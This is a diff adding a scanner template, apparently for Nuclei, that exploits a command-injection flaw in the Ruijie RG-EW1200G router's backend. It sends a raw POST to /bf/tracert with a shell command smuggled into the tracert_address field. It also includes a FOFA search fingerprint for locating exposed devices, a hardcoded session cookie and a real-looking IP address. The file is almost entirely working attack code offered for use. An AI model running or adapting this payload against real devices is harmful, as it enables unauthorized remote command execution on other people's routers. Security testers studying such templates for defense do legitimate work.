@@ -1,0 +1,46 @@
+id: poc-13a7886e0cd6ba2dcf5a
+info:
+  name: 锐捷RG-EW1200G路由器后台命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/13a7886e0cd6ba2dcf5ae2b94d7fc4b0
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 13a7886e0cd6ba2dcf5ae2b94d7fc4b0
+    fofa: body="/static/js/app.09df2a9e44ab48766f5f.js"
+http:
+- raw:
+  - 'POST /bf/tracert HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 53
+
+    Accept: application/json, text/plain, */*
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Content-Type: application/json;charset=UTF-8
+
+    Origin: http://175.167.44.37:6060
+
+    Referer: http://175.167.44.37:6060/
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: bcrsession=f1d7956e195d123d8f0b4a6670553a7cda05348636f998dddeff1d3f3fe1fc8d87ed86b4b4818536
+
+    Connection: close
+
+
+    {"tracert_address":"||echo `id`","is_first_req":true}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
